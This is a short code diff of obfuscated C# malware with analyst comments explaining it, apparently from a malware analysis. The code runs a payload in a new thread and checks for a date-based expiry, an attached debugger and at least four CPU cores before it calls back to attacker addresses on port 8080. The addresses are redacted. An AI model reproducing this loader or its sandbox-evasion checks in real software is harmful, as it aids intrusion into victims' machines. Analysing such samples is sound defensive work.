@@ -31,9 +31,9 @@ static void OdKdhiXlGPR(byte[] aLqrQtxWyqyjNa) {
         DZMOxMok = CreateThread(0, 0, WMJEENzUpHTofv, MOuefoffupU, 0, ref DcoGzjJYxpQ);
         WaitForSingleObject(DZMOxMok, 0xFFFFFFFF); }}
 static void Main(){
-DateTime timetodaybe = DateTime.Today; // The malware checks the date time for today
+DateTime systimelx9Xaadddays = DateTime.Today; // The malware checks the date time for today
 DateTime daysremove = HVxTSglIFVwtn.AddDays(7); // Then it scheduled the expired days for 7, the malware doesn't seem like it will delete itself, it will probably won't work anymore, see code below for more info.
-if (timetodaybe < HVxTSglIFVwtn) { // Checks the date of today, and checks how much days left for the malware to be able to be executable
+if (systimelx9Xaadddays < HVxTSglIFVwtn) { // Checks the date of today, and checks how much days left for the malware to be able to be executable
 	if (!System.Diagnostics.Debugger.IsAttached) { // Checks for a debugger
 		if (System.Environment.ProcessorCount >= 4) { // Checks for the amount of the processor cores, if the ProcessorCount is 4, the malware is able to be executable
     byte[] RNvLOoDB = null; RNvLOoDB = skKFSkknxZi2("...............","...............","...............", 8080); // If the malware has the date of today and the expired days is 7 and the malware didn't pass the 7 days, and it didn't found debugger and the system has 4 cores, it will finally reverse back the connection between the attackers and the victim's computer through the port 8080.. in the "...............", there was 3 Iranian IP addresses that we decided the delete them from the code and saving them in an encrypted file for research purposes.
